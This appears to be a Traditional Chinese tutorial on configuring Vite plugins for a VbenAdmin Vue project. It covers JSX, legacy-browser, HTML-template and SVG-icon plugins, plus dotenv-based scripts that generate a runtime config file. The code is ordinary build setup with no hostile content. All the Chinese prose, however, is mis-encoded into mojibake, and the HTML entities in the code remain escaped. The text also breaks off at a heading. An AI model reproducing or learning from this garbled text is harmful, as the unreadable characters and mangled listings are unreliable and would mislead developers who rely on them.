å‡å¦‚æˆ‘å€‘è¦å¯¦ç¾ä¸€å€‹çµ„ä»¶æ¸²æŸ“\u0026lt;hn\u0026gt;\u0026lt;/hn\u0026gt;æ¨™ç±¤ï¼Œnæ˜¯æˆ‘å€‘å‚³å…¥çš„åƒæ•¸ã€‚å¦‚æœç”¨templateï¼Œé‚£éº¼æˆ‘å€‘è¦å¯«6å€‹v-ifã€‚ä½†æ˜¯å¦‚æœä½¿ç”¨JSXï¼Œæˆ‘å€‘å°±å¯ä»¥ç›´æ¥å°‡næ”¾åˆ°æ¨™ç±¤ä¸­å»ã€‚\nåƒè€ƒé€£çµ @vitejs/plugin-vue-jsxçš„npmé¦–é  Vue-JSX Vue- JSX ä¸­çš„ç”¨æ³• Vue-setupä¸­ä½¿ç”¨JSX Vue-æ¨¡æ¿èªæ³• å®‰è£ 1 yarn add @vitejs/plugin-vue-jsx --dev vue-jsxæ’ä»¶ä¸ç”¨é…ç½®ï¼Œå¯ä»¥ç›´æ¥æ”¾é€²å»ã€‚\nbuild/vite/plugin/index.ts 1 2 3 4 5 6 7 8 9 // ... import vueJsx from \u0026#39;@vitejs/plugin-vue-jsx\u0026#39;; // ... export function createVitePlugins(viteEnv: ViteEnv, isBuild: boolean) { // ... const vitePlugins: (Plugin | Plugin[])[] = [vue(),vueJsx()]; // ... return vitePlugins; } Viteæ’ä»¶-@vitejs-plugin-legacy èªªæ˜ åŸæ–‡æè¿°ï¼š\næ³¨ï¼šæ­¤æ’ä»¶éœ€è¦vite@^2.0.0-beta.12ã€‚\nViteé»˜èªçš„ç€è¦½å™¨æ”¯æŒåŸºç·šæ˜¯åŸç”ŸESMã€‚æœ¬æ’ä»¶ç‚ºä¸æ”¯æŒåŸç”ŸESMçš„å‚³çµ±ç€è¦½å™¨æä¾›æ”¯æŒã€‚\né»˜èªæƒ…æ³ä¸‹ï¼Œè©²æ’ä»¶å°‡ç‚ºæœ€çµ‚bundleä¸­çš„æ¯å€‹chunkç”Ÿæˆä¸€å€‹ç›¸æ‡‰çš„legacy chunkï¼Œç”¨@babel/reset-envé€²è¡Œè½‰æ›ï¼Œä¸¦ä»¥SystemJSæ¨¡å¡Šçš„å½¢å¼ç™¼å¸ƒï¼ˆä»ç„¶æ”¯æŒä»£ç¢¼åˆ†å‰²ï¼ï¼‰ã€‚\nç”Ÿæˆä¸€å€‹åŒ…å«SystemJSé‹è¡Œæ™‚çš„polyfill chunkï¼Œä»¥åŠç”±æŒ‡å®šçš„ç€è¦½å™¨ç›®æ¨™å’Œæ†ç¶åŒ…ä¸­çš„å¯¦éš›ä½¿ç”¨æƒ…æ³æ±ºå®šçš„ä»»ä½•å¿…è¦çš„polyfillsã€‚\nåœ¨ç”Ÿæˆçš„HTMLä¸­è¨»å…¥\u0026lt;script nomodule\u0026gt;æ¨™ç±¤ï¼Œä»¥ä¾¿åœ¨æ²’æœ‰æœ¬åœ°ESMæ”¯æŒçš„ç€è¦½å™¨ä¸­æœ‰æ¢ä»¶åœ°åŠ è¼‰polyfillså’Œlegacy bundleã€‚\næ³¨å…¥ import.meta.env.LEGACY env è®Šé‡ï¼Œè©²è®Šé‡åƒ…åœ¨ legacy ç”Ÿç”¢æ§‹å»ºä¸­ç‚ºçœŸï¼Œè€Œåœ¨æ‰€æœ‰å…¶ä»–æƒ…æ³ä¸‹ç‚ºå‡ã€‚(éœ€è¦vite@^2.0.0-beta.69)ã€‚\næ‰€ä»¥é€™å€‹æ˜¯ä¸€å€‹ç€è¦½å™¨å…¼å®¹çš„æ’ä»¶ã€‚æˆ‘å€‘ç›´æ¥å®‰è£ä½¿ç”¨ï¼Œå€‹äººæ„Ÿè¦ºå­¸ç¿’çš„è©±ä¹Ÿç”¨ä¸ä¸Šã€‚\nåƒè€ƒé€£çµ @vitejs/plugin-legacyçš„npmé¦–é  å®‰è£ 1 yarn add @vitejs/plugin-legacy --dev VbenAdminé…ç½®build/vite/plugin/index.tsï¼š build/vite/plugin/index.ts 1 2 3 4 5 6 7 8 9 10 // ... import legacy from \u0026#39;@vitejs/plugin-legacy\u0026#39;; // ... export function createVitePlugins(viteEnv: ViteEnv, isBuild: boolean) { // ... // @vitejs/plugin-legacy VITE_LEGACY \u0026amp;\u0026amp; isBuild \u0026amp;\u0026amp; vitePlugins.push(legacy()); // ... return vitePlugins; } Viteæ’ä»¶-vite-plugin-html èªªæ˜ åŸæ–‡æè¿°ï¼š\nä¸€å€‹ç‚ºindex.htmlæä¾›minifyå’ŒåŸºæ–¼EJSæ¨¡æ¿åŠŸèƒ½çš„Viteæ’ä»¶ã€‚\nminifyï¼šå£“ç¸®index.htmlä»£ç¢¼ã€‚ EJSï¼šçµ¦index.htmlæä¾›è¨ªå•è®Šé‡çš„èƒ½åŠ›ã€‚ åƒè€ƒé€£çµ vite-plugin-htmlçš„npmé¦–é  å®‰è£ 1 yarn add vite-plugin-html --dev å‰µå»ºé…ç½®æ–‡ä»¶ build/vite/plugin/html.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 /** * Plugin to minimize and use ejs template syntax in index.html. * https://github.com/anncwb/vite-plugin-html */ import type { Plugin } from \u0026#39;vite\u0026#39;; import type { ViteEnv } from \u0026#39;../../utils\u0026#39;; import html from \u0026#39;vite-plugin-html\u0026#39;; import pkg from \u0026#39;../../../package.json\u0026#39;; import { GLOB_CONFIG_FILE_NAME } from \u0026#39;../../constant\u0026#39;; export function configHtmlPlugin(env: ViteEnv, isBuild: boolean) { const { VITE_GLOB_APP_TITLE, VITE_PUBLIC_PATH } = env; // â†“ é€™é‡Œå¾ŒçºŒç« å‹•æ…‹é…ç½®è¬›è§£ // const path = VITE_PUBLIC_PATH.endsWith(\u0026#39;/\u0026#39;) ? VITE_PUBLIC_PATH : `${VITE_PUBLIC_PATH}/`; // const getAppConfigSrc = () =\u0026gt; { // return `${path || \u0026#39;/\u0026#39;}${GLOB_CONFIG_FILE_NAME}?v=${pkg.version}-${new Date().getTime()}`; // }; const htmlPlugin: Plugin[] = html({ minify: isBuild, inject: { // Inject data into ejs template injectData: { title: VITE_GLOB_APP_TITLE, }, // â†“ é€™é‡Œå¾ŒçºŒç« å‹•æ…‹é…ç½®è¬›è§£ // tags: isBuild // ? [ // { // tag: \u0026#39;script\u0026#39;, // attrs: { // src: getAppConfigSrc(), // }, // }, // ] // : [], }, }); return htmlPlugin; } é…ç½®Viteæ’ä»¶ build/vite/plugin/index.ts 1 2 3 4 5 6 7 8 9 // ... import { configHtmlPlugin } from \u0026#39;./html\u0026#39;; export function createVitePlugins(viteEnv: ViteEnv, isBuild: boolean) { // ... // vite-plugin-html vitePlugins.push(configHtmlPlugin(viteEnv, isBuild)); // ... } è£œå…… åšå®Œæœ¬ç« æ“ä½œä¹‹å¾Œï¼Œæˆ‘çªç„¶ç™¼ç¾é …ç›®ä¸èƒ½ç·¨è­¯äº†ã€‚\nç¸½æ˜¯å ±package.jsonæ‰¾ä¸åˆ°ã€‚æˆ‘çœ‹äº†ä¸€ä¸‹ä»£ç¢¼ï¼Œä¸»è¦å°±æ˜¯build\\vite\\plugin\\html.tsä¸­çš„å°å…¥ç„¡æ³•æ‰¾åˆ°ã€‚\næˆ‘åå¾©å°æ¯”äº†ä¸€ä¸‹VbenAdminçš„æºç¢¼ã€‚ä¹Ÿæ²’æœ‰ç™¼ç¾æœ‰ä»€éº¼ä¸åŒçš„åœ°æ–¹ã€‚\nç„¶å¾Œæˆ‘åˆè©¦äº†ä¸€ä¸‹ï¼Œç•¶åŸ·è¡Œviteå‘½ä»¤çš„æ™‚å€™ï¼Œbuildæ–‡ä»¶å¤¾ä¸‹å§‹çµ‚ä¸èƒ½è¨ªå•package.jsonã€‚ä½†æ˜¯srcå’Œvite.config.tsä¸­éƒ½å¯ä»¥å°å…¥è¨ªå•ã€‚\né‚£éº¼é€™è£¡æœ‰å…©ç¨®è¬›è§£æ–¹æ¡ˆï¼š\nå»æ‰å°å…¥ é€™è£¡çš„å°å…¥åªæ˜¯æˆ‘å€‘åœ¨ä½¿ç”¨_app.config.jsçš„æ™‚å€™åŠ ä¸Šä¸€å€‹ç‰ˆæœ¬ä¿¡æ¯ã€‚å¯ä»¥è®“æˆ‘å€‘çŸ¥é“é€™å€‹é …ç›®æ˜¯å¤šä¹…æ‰“åŒ…çš„ï¼Œæ‰“åŒ…çš„æ™‚å€™ç‰ˆæœ¬æ˜¯å¤šå°‘ã€‚æ‰€ä»¥å»æ‰ä¹Ÿç„¡å¦¨ï¼Œ_app.config.jsé‚„æ˜¯ä¸€æ¨£å¯ä»¥è¨ªå•çš„ã€‚\nå¾vite.config.tsä¸­å‚³åƒä¸‹å» æˆ‘ä½¿ç”¨äº†é€™å€‹æ–¹æ¡ˆï¼Œå› ç‚ºè¬ä¸€buildæ–‡ä»¶å¤¾å…¶ä»–åœ°æ–¹è¦ç”¨package.jsonå‘¢ã€‚ä¸éç”¨çš„åœ°æ–¹æ‡‰è©²ä¹Ÿå¾ˆå°‘å§ã€‚\nä¿®æ”¹vite.config.tsï¼š\nvite.config.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 // ... import pkg from \u0026#39;./package.json\u0026#39;; // ... export default ({ command, mode }: ConfigEnv): UserConfig =\u0026gt; { // ... return { // ... // The vite plugin used by the project. The quantity is large, so it is separately extracted and managed plugins: createVitePlugins(viteEnv, isBuild, pkg), // ... }; }; ä¿®æ”¹build/vite/plugin/index.tsï¼š\nbuild/vite/plugin/index.ts 1 2 3 4 5 6 7 // ... export function createVitePlugins(viteEnv: ViteEnv, isBuild: boolean, pkg: any) { // ... vitePlugins.push(configHtmlPlugin(viteEnv, isBuild, pkg)); return vitePlugins; } ä¿®æ”¹build/vite/plugin/html.tsï¼š\nbuild/vite/plugin/html.ts 1 2 3 4 5 6 7 8 9 10 11 // ... import html from \u0026#39;vite-plugin-html\u0026#39;; export function configHtmlPlugin(env: ViteEnv, isBuild: boolean, pkg: any) { // ... const getAppConfigSrc = () =\u0026gt; { return `${path || \u0026#39;/\u0026#39;}${GLOB_CONFIG_FILE_NAME}?v=${pkg.version}-${new Date().getTime()}`; }; // ... return htmlPlugin; } å®Œå–„buildçš„utils.ts èªªæ˜ å®Œå–„build\\utils.tsæ–‡ä»¶ã€‚\nç¬¬ä¸€éƒ¨åˆ† é™¤äº†é€™å€‹processï¼Œæ‡‰è©²ä¹Ÿæ²’æœ‰è¦è§£é‡‹çš„å§ã€‚\nNodeä¸­æ–‡æ–‡æª”-process\nbuild/utils.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 export function isDevFn(mode: string): boolean { return mode === \u0026#39;development\u0026#39;; } export function isProdFn(mode: string): boolean { return mode === \u0026#39;production\u0026#39;; } /** * Whether to generate package preview */ export function isReportMode(): boolean { return process.env.REPORT === \u0026#39;true\u0026#39;; } å®‰è£dotenv dotenvä¾è³´çš„ä½œç”¨ï¼šå¾.evnæ–‡ä»¶æµBufferä¸­è®€å–å±¬æ€§è¼¸å‡ºä¸€å€‹å°è±¡ã€‚\né‚£éº¼å’Œæˆ‘å€‘ä¹‹å‰çš„åŠ è¼‰ç’°å¢ƒè®Šé‡çš„å€åˆ¥ï¼š\nViteçš„loadEnv()ï¼šé€™å€‹æ–¹æ³•Viteçš„å®˜ç¶²ä¸Šè²Œä¼¼æ²’æœ‰é–‹æ”¾ï¼Œè€Œä¸”ç²å–çš„æ–‡ä»¶æ˜¯æŒ‡å®šçš„ï¼Œç²å–çš„å°è±¡éœ€è¦æˆ‘å€‘è‡ªå·±æ ¼å¼åŒ–ä¸€ä¸‹ã€‚ Vbençš„wrapperEnv()ï¼šé€™æ˜¯ä¸€å€‹æ ¼å¼åŒ–ç’°å¢ƒè®Šé‡çš„æ–¹æ³•ã€‚ dotenvï¼šæ˜¯ä¸€å€‹ä¾è³´ï¼Œå…¶åŠŸèƒ½ä¸åƒ…åƒ…æ˜¯ç²å–ç’°å¢ƒè®Šé‡ï¼Œç•¶ç„¶æˆ‘å€‘ç›®å‰åªç”¨å®ƒä¾†ç²å–æŒ‡å®šçš„.envæ–‡ä»¶ã€‚ dotenvçš„npmé¦–é \n1 yarn add dotenv --dev ç¬¬äºŒéƒ¨åˆ† Nodeä¸­æ–‡æ–‡æª”-fs Nodeä¸­æ–‡æ–‡æª”-path dotenvçš„npmé¦–é  build/utils.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 import fs from \u0026#39;fs\u0026#39;; import path from \u0026#39;path\u0026#39;; import dotenv from \u0026#39;dotenv\u0026#39;; /** * Get the environment variables starting with the specified prefix * @param match prefix * @param confFiles ext */ export function getEnvConfig(match = \u0026#39;VITE_GLOB_\u0026#39;, confFiles = [\u0026#39;.env\u0026#39;, \u0026#39;.env.production\u0026#39;]) { let envConfig = {}; // â†“ å¾ªç’°æ–‡ä»¶å confFiles.forEach((item) =\u0026gt; { try { // â†“ åŒæ­¥è®€å–æ ¹ç›®éŒ„ä¸‹æŒ‡å®šçš„æ–‡ä»¶ï¼Œå°‡è®€å–çš„å…­å‚³å…¥dotenvè¼¸å‡ºå°è±¡ const env = dotenv.parse(fs.readFileSync(path.resolve(process.cwd(), item))); // â†“ å°‡æ–°ç²å–çš„å°è±¡è¿½åŠ åˆ°çµæœä¸­ï¼Œç›¸åŒçš„è¦†è“‹ envConfig = { ...envConfig, ...env }; } catch (error) {} }); // â†“ æª¢æŸ¥è¼¸å‡ºçµæœ Object.keys(envConfig).forEach((key) =\u0026gt; { // â†“ å¦‚æœä¸æ˜¯ä»¥å‚³å…¥çš„matchè®Šé‡é–‹çš„å°±ç›´æ¥åˆªé™¤ const reg = new RegExp(`^(${match})`); if (!reg.test(key)) { Reflect.deleteProperty(envConfig, key); } }); return envConfig; } /** * Get user root directory * @param dir file path */ export function getRootPath(...dir: string[]) { return path.resolve(process.cwd(), ...dir); } Vbençš„ç²å–é…ç½®æ–‡ä»¶åçš„æ–¹æ³• build/getConfigFileName.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 /** * Get the configuration file variable name * @param env */ export const getConfigFileName = (env: Record\u0026lt;string, any\u0026gt;) =\u0026gt; { return ( `__PRODUCTION__${env.VITE_GLOB_APP_SHORT_NAME || \u0026#39;__APP\u0026#39;}__CONF__` // â†“ æ›æˆå¤§å¯« .toUpperCase() // â†“ å°‡ç©ºç™½æ›æˆç©ºå­—ç¬¦ä¸² .replace(/\\s/g, \u0026#39;\u0026#39;) ); }; Vbenå‹•æ…‹é…ç½®ç’°å¢ƒè®Šé‡ èªªæ˜ å‰é¢ç« ç¯€ä¸­ï¼Œæˆ‘å€‘åœ¨build\\vite\\pluginä¸­è¨»é‡‹ä¸€æ®µindex.htmlä¸­æ’å…¥çš„scriptæ®µã€‚é€™ä¸€æ®µscriptæ˜¯ç”¨æ–¼Vbençš„å‹•æ…‹é…ç½®ç’°å¢ƒè®Šé‡çš„ã€‚\nç•¶ä½ æ‰“åŒ…å®Œé …ç›®ä¹‹å¾Œï¼Œä½ çš„é …ç›®çš„ç’°å¢ƒè®Šé‡å°±ä¸å¯ä»¥è®Šäº†ã€‚æ­¤æ™‚å¦‚æœä½ æƒ³ä¿®æ”¹ä¸€ä¸‹é …ç›®çš„åŸºç¤APIè·¯å¾‘ï¼Œé‚£éº¼ä½ éœ€è¦ä¿®æ”¹.envæ–‡ä»¶ï¼Œç„¶å¾Œå†æ¬¡æ‰“åŒ…ä¸€éã€‚é€™éº¼åšå¾ˆéº»ç…©ã€‚æ‰€ä»¥VbenAdminå°‡ç’°å¢ƒè®Šé‡æŠ½é›¢å‡ºä¾†ã€‚\nç•¶ä½ çš„é …ç›®æ‰“åŒ…å®Œæˆä¹‹å¾Œï¼Œå¦‚æœä½ é‚„æƒ³ä¿®æ”¹ç’°å¢ƒè®Šé‡ï¼Œé‚£éº¼å¯ä»¥ç›´æ¥ä¿®æ”¹diståŒ…ä¸‹çš„_app.config.jsæ–‡ä»¶ã€‚\nä¸‹é¢çœ‹å¯¦ç¾ã€‚\nå®‰è£fs-extra 1 yarn add fs-extra @types/fs-extra --dev fs-extraçš„npmé¦–é ï¼šfs-extraæ·»åŠ æœ¬æ©Ÿfsæ¨¡å¡Šä¸­æœªåŒ…å«çš„æ–‡ä»¶ç³»çµ±æ–¹æ³•ã€‚\nç·¨å¯«ç”Ÿæˆé…ç½®æ–‡ä»¶çš„ç¨‹åº Node-Api-fs\nbuild/script/buildConf.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 /** * Generate additional configuration files when used for packaging. The file can be configured with some global variables, so that it can be changed directly externally without repackaging */ import { GLOB_CONFIG_FILE_NAME, OUTPUT_DIR } from \u0026#39;../constant\u0026#39;; import fs, { writeFileSync } from \u0026#39;fs-extra\u0026#39;; import chalk from \u0026#39;chalk\u0026#39;; import { getRootPath, getEnvConfig } from \u0026#39;../utils\u0026#39;; import { getConfigFileName } from \u0026#39;../getConfigFileName\u0026#39;; import pkg from \u0026#39;../../package.json\u0026#39;; function createConfig( { // â†“ windowså°åƒä¸‹çš„å­˜å„²é…ç½®çš„å±¬æ€§å configName, // â†“ å­˜å„²é…ç½®çš„å°è±¡ config, // â†“ JSæ–‡ä»¶å configFileName = GLOB_CONFIG_FILE_NAME, }: { configName: string; config: any; configFileName?: string } = { configName: \u0026#39;\u0026#39;, config: {} } ) { try { // â†“ è®Šé‡å­—ç¬¦ä¸² const windowConf = `window.${configName}`; // Ensure that the variable will not be modified // â†“ å°‡é…ç½®çš„å°åƒä»¥JSONå­—ç¬¦ä¸²æ ¼å¼æ‹¼æ¥åˆ°è®Šé‡å­—ç¬¦ä¸²å¾Œé¢ï¼Œæœ€å¾Œç”¨æ­£å‰‡å°‡ç©ºæ ¼å»æ‰ const configStr = `${windowConf}=${JSON.stringify(config)}; Object.freeze(${windowConf}); Object.defineProperty(window, \u0026#34;${configName}\u0026#34;, { configurable: false, writable: false, }); `.replace(/\\s/g, \u0026#39;\u0026#39;); // â†“ å‰µå»ºdistæ–‡ä»¶å¤¾ fs.mkdirp(getRootPath(OUTPUT_DIR)); // â†“ å°‡å­—ç¬¦ä¸²å¯«å…¥åˆ°distæ–‡ä»¶ä¸‹çš„æŒ‡å®šJSæ–‡ä»¶åçš„æ–‡ä»¶ä¸­ writeFileSync(getRootPath(`${OUTPUT_DIR}/${configFileName}`), configStr); console.log(chalk.cyan(`âœ¨ [${pkg.name}]`) + ` - configuration file is build successfully:`); console.log(chalk.gray(OUTPUT_DIR + \u0026#39;/\u0026#39; + chalk.green(configFileName)) + \u0026#39;\\n\u0026#39;); } catch (error) { console.log(chalk.red(\u0026#39;configuration file configuration file failed to package:\\n\u0026#39; + error)); } } export function runBuildConfig() { // â†“ ç²å–æˆ‘å€‘å¯ä»¥é…ç½®çš„ç’°å¢ƒè®Šé‡å°è±¡ const config = getEnvConfig(); // â†“ ç²å–é…ç½®æ–‡ä»¶çš„JSå const configFileName = getConfigFileName(config); // â†“ å‰µå»ºæ–‡ä»¶ createConfig({ config, configName: configFileName }); } å®‰è£yargs yargsçš„npmé¦–é ï¼šè®€å–ä½ åŸ·è¡Œçš„å‘½ä»¤è¡Œå‘½ä»¤ä¸­çš„åƒæ•¸é¸é …ã€‚\n1 2 yarn add yargs --dev yarn add @types/yargs --dev ç·¨å¯«è…³æœ¬è§¸ç™¼æ–‡ä»¶ chalkçš„npmé¦–é ï¼šä¸€å€‹å½©è‰²console.logçš„å·¥å…·ï¼Œé€™å€‹ä¾è³´è¢«å…¶ä»–ä¾è³´ä½œç‚ºç”Ÿç”¢ä¾è³´å®‰è£åœ¨æœ¬é …ç›®ä¸­äº†ï¼Œæ‰€ä»¥ä¹Ÿä¸å»çŒœæ˜¯å“ªå€‹ä¾è³´çš„äº†ï¼Œç›´æ¥ä½¿ç”¨ã€‚\nbuild/script/postBuild.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 // #!/usr/bin/env node import { argv } from \u0026#39;yargs\u0026#39;; import { runBuildConfig } from \u0026#39;./buildConf\u0026#39;; import chalk from \u0026#39;chalk\u0026#39;; import pkg from \u0026#39;../../package.json\u0026#39;; // â†“ å®šç¾©å‰µå»ºé…ç½®æ–‡ä»¶çš„æ–¹æ³•ï¼Œæœ€æ¢ä»¶åˆ¤æ–· export const runBuild = async () =\u0026gt; { try { // ç²å–å‘½ä»¤ä¸­ä¸ä»¥\u0026#39;-\u0026#39;é–‹é ­çš„åƒæ•¸ const argvList = argv._; // Generate configuration file // â†“ å¦‚æœåƒæ•¸ä¸­åŒ…å«\u0026#39;no-conf\u0026#39;ï¼Œé‚£éº¼å°±ä¸å‰µå»ºé…ç½®æ–‡ä»¶ if (!argvList.includes(\u0026#39;no-conf\u0026#39;)) { // â†“ åŒæ­¥å‰µå»ºé…ç½®æ–‡ä»¶ await runBuildConfig(); } console.log(`âœ¨ ${chalk.cyan(`[${pkg.name}]`)}` + \u0026#39; - build successfully!\u0026#39;); } catch (error) { console.log(chalk.red(\u0026#39;vite build error:\\n\u0026#39; + error)); process.exit(1); } }; // â†“ åŸ·è¡Œæ–¹æ³• runBuild(); å®‰è£esno esnoçš„npmé¦–é ï¼šå‘½ä»¤è¡ŒåŸ·è¡Œä¸€å€‹TSæ–‡ä»¶\n1 yarn add esno --dev ç·¨å¯«è…³æœ¬ åœ¨ç·¨è­¯çš„æ™‚å€™èª¿ç”¨TSæ–‡ä»¶ï¼š\npackage.json 1 2 3 4 5 6 7 { \u0026#34;scripts\u0026#34;: { // ... \u0026#34;build\u0026#34;: \u0026#34;vite build \u0026amp;\u0026amp; esno ./build/script/postBuild.ts\u0026#34;, \u0026#34;build-noconf\u0026#34;: \u0026#34;vite build \u0026amp;\u0026amp; esno ./build/script/postBuild.ts no-conf\u0026#34; } } index.htmlæ³¨å…¥é…ç½®æ–‡ä»¶ build/vite/plugin/html.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 /** * Plugin to minimize and use ejs template syntax in index.html. * https://github.com/anncwb/vite-plugin-html */ import type { Plugin } from \u0026#39;vite\u0026#39;; import type { ViteEnv } from \u0026#39;../../utils\u0026#39;; import html from \u0026#39;vite-plugin-html\u0026#39;; import pkg from \u0026#39;../../../package.json\u0026#39;; import { GLOB_CONFIG_FILE_NAME } from \u0026#39;../../constant\u0026#39;; export function configHtmlPlugin(env: ViteEnv, isBuild: boolean) { const { VITE_GLOB_APP_TITLE, VITE_PUBLIC_PATH } = env; const path = VITE_PUBLIC_PATH.endsWith(\u0026#39;/\u0026#39;) ? VITE_PUBLIC_PATH : `${VITE_PUBLIC_PATH}/`; const getAppConfigSrc = () =\u0026gt; { return `${path || \u0026#39;/\u0026#39;}${GLOB_CONFIG_FILE_NAME}?v=${pkg.version}-${new Date().getTime()}`; }; const htmlPlugin: Plugin[] = html({ minify: isBuild, inject: { // Inject data into ejs template injectData: { title: VITE_GLOB_APP_TITLE, }, // Embed the generated app.config.js file // â†“ åœ¨æ­¤è™•æ’å…¥ tags: isBuild ? [ { tag: \u0026#39;script\u0026#39;, attrs: { src: getAppConfigSrc(), }, }, ] : [], }, }); return htmlPlugin; } æ³¨æ„ ä¹‹å¾Œåœ¨æ¥­å‹™é‚è¼¯ä¸­ç²å–ç’°å¢ƒè®Šé‡ï¼Œå°±éœ€è¦å¾é€™å€‹JSæ–‡ä»¶ä¸­ç²å–äº†ã€‚å¾è€Œé”åˆ°åœ¨ç”Ÿç”¢ç’°å¢ƒæ”¹é…ç½®çš„éœ€æ±‚ã€‚\nåƒè€ƒï¼šsrc\\utils\\env.tsï¼Œä½†æ˜¯é€™å€‹å¾Œé¢å†èªªã€‚\nViteæ’ä»¶-vite-plugin-svg-icon èªªæ˜ ç•¶ä½ ä½¿ç”¨è©²æ’ä»¶çš„æ™‚å€™ï¼ŒæŒ‡å®šå¥½å­˜æ”¾svgçš„æ–‡ä»¶å¤¾ã€‚å†æŒ‰ç…§æŒ‡å®šçš„æ–¹å¼å»è¨ªå•svgåœ–ç‰‡ã€‚å°±å¯ä»¥å†ä¸ç”¢ç”Ÿhttpè«‹æ±‚çš„æƒ…æ³ä¸‹æ¸²æŸ“å‡ºsvgåœ–ç‰‡ã€‚\nä½¿ç”¨è©²æ’ä»¶æ™‚ï¼Œæ’ä»¶æœƒè‡ªå‹•å°‡æ‰€æœ‰svgåœ–ç‰‡åŠ è¼‰åˆ°HTMLä¸­ã€‚ä¸¦ä¸”æ¯ä¸€å€‹svgå°‡æœƒè¢«éæ¿¾å»ç„¡ç”¨çš„ä¿¡æ¯æ•¸æ“šã€‚è®“svgé”åˆ°æœ€å°çš„å€¼ã€‚ä¹‹å¾Œä½¿ç”¨svgåœ–ç‰‡å°±åªéœ€è¦æ“ä½œDOMå³å¯ï¼Œè€Œä¸éœ€è¦ç™¼é€httpè«‹æ±‚ã€‚\nå®‰è£ 1 yarn add vite-plugin-svg-icons --dev å‰µå»ºé…ç½® build/vite/plugin/svgSprite.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 /** * Vite Plugin for fast creating SVG sprites. * https://github.com/anncwb/vite-plugin-svg-icons */ import SvgIconsPlugin from \u0026#39;vite-plugin-svg-icons\u0026#39;; import path from \u0026#39;path\u0026#39;; export function configSvgIconsPlugin(isBuild: boolean) { const svgIconsPlugin = SvgIconsPlugin({ // â†“ æœ¬åœ°svgåœ–ç‰‡åœ°å€ iconDirs: [path.resolve(process.cwd(), \u0026#39;src/assets/icons\u0026#39;)], svgoOptions: isBuild, // åœ–æ¨™IDçš„æ¨£å¼ symbolId: \u0026#39;icon-[dir]-[name]\u0026#39;, }); return svgIconsPlugin; } é¸é …svgOptionsçš„booleané¡å‹ä¸å¤ªæ¸…æ¥šæ˜¯ä¹¾ä»€éº¼çš„ã€‚ä½†æ˜¯å°åƒé¡å‹æ˜¯æ§åˆ¶svgéæ¿¾ç„¡ç”¨ä¿¡æ¯çš„é¸é …ã€‚ä½¿ç”¨trueæ˜¯ä½¿ç”¨é»˜èªé¸é …ï¼Œfalseæ™‚ä¸çŸ¥é“åšä»€éº¼çš„ä½†æ˜¯ä¹Ÿæ²’ä»€éº¼å½±éŸ¿ã€‚\nç”¨æ–¼é…ç½® build/vite/plugin/index.ts 1 2 3 4 5 6 7 8 9 10 // ... import { configSvgIconsPlugin } from \u0026#39;./svgSprite\u0026#39;; export function createVitePlugins(viteEnv: ViteEnv, isBuild: boolean) { // ... // vite-plugin-svg-icons vitePlugins.push(configSvgIconsPlugin(isBuild)); // ... return vitePlugins; } mainå°å…¥ src/main.ts 1 2 3 // ... import \u0026#39;vite-plugin-svg-icons/register\u0026#39;; // ... å‰µå»ºSvgçµ„ä»¶ é€™è£¡æœ‰ä¸€å€‹æ¨£å¼ï¼Œæ˜¯å…¨å±€ä¸Šä¸‹æ–‡æ³¨å…¥çš„ã€‚é€™å€‹å¾Œé¢å†è¬›ï¼Œå…ˆå¯«æˆstringã€‚\nsrc/components/Icon/src/SvgIcon.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 \u0026lt;template\u0026gt; \u0026lt;svg class=\u0026#34;vben-svg-icon\u0026#34; :class=\u0026#34;[$attrs.class]\u0026#34; :style=\u0026#34;getStyle\u0026#34; aria-hidden=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;use :xlink:href=\u0026#34;symbolId\u0026#34; /\u0026gt; \u0026lt;/svg\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#34;ts\u0026#34;\u0026gt; import type { CSSProperties } from \u0026#39;vue\u0026#39;; import { defineComponent, computed } from \u0026#39;vue\u0026#39;; // import { useDesign } from \u0026#39;/@/hooks/web/useDesign\u0026#39;; export default defineComponent({ name: \u0026#39;SvgIcon\u0026#39;, props: { prefix: { type: String, default: \u0026#39;icon\u0026#39;, }, name: { type: String, required: true, }, size: { type: [Number, String], default: 16, }, }, setup(props) { // const { prefixCls } = useDesign(\u0026#39;svg-icon\u0026#39;); const symbolId = computed(() =\u0026gt; `#${props.prefix}-${props.name}`); const getStyle = computed( (): CSSProperties =\u0026gt; { const { size } = props; let s = `${size}`; s = `${s.replace(\u0026#39;px\u0026#39;, \u0026#39;\u0026#39;)}px`; return { width: s, height: s, }; } ); // prefixCls, return { symbolId, getStyle }; }, }); \u0026lt;/script\u0026gt; \u0026lt;style lang=\u0026#34;less\u0026#34; scoped\u0026gt; // @prefix-cls: ~\u0026#39;@{namespace}-svg-icon\u0026#39;; // .@{prefix-cls} { .vben-svg-icon { overflow: hidden; vertical-align: -0.15em; fill: currentColor; } \u0026lt;/style\u0026gt; Viteæ’ä»¶-vite-plugin-windicss èªªæ˜ åœ¨Viteä¸Šå–®ç¨ä½¿ç”¨Tailwindæ™‚ï¼Œæ¸²æŸ“é€Ÿåº¦å¾ˆæ…¢ã€‚\nvite-plugin-windicssæ¯”Tailwindå¿«20åˆ°100å€ã€‚\nvite-plugin-windicssçš„npmé¦–é  windicsså®˜ç¶² å®‰è£ 1 yarn add vite-plugin-windicss --dev å‰µå»ºWindicssé…ç½®æ–‡ä»¶ 